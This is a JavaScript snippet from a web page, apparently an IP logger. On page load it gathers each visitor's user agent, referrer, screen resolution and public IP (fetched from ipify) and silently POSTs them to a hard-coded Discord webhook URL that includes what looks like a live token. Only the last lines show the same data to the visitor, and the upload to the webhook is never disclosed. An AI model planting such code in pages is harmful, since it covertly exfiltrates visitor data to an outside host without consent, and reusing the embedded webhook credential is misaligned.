      const webhookUrl = "https://discord.com/api/webhooks/1082444472589221979/e51YJx2YMhDRtBfuqXPHcIQidlo3gqOWg-T7NyHGrAqAins3Nbve--Z0UrmKPEOjxMcU";

      document.addEventListener("DOMContentLoaded", function() {
        const message = {
          embeds: [
            {
              title: "Visitor Information",
              color: 0xff0000,
              fields: [
                {
                  name: "User Agent",
                  value: navigator.userAgent,
                  inline: false
                },
                {
                  name: "Referrer",
                  value: document.referrer,
                  inline: false
                },
                {
                  name: "Screen Resolution",
                  value: screen.width + "x" + screen.height,
                  inline: false
                },
                {
                  name: "IP Address",
                  value: "",
                  inline: false
                }
              ]
            }
          ]
        };
        fetch("https://api.ipify.org?format=json")
          .then(response => response.json())
          .then(data => {
            message.embeds[0].fields[3].value = data.ip;
            fetch(webhookUrl, {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify(message)
            });
          });
      });
      
      document.getElementById("user-agent").textContent = navigator.userAgent;
      document.getElementById("referrer").textContent = document.referrer;
      document.getElementById("screen-resolution").textContent = screen.width + "x" + screen.height;
      fetch("https://api.ipify.org?format=json")
          .then(response => response.json())
          .then(data => {
            document.getElementById("ip-address").textContent = data.ip;
          });
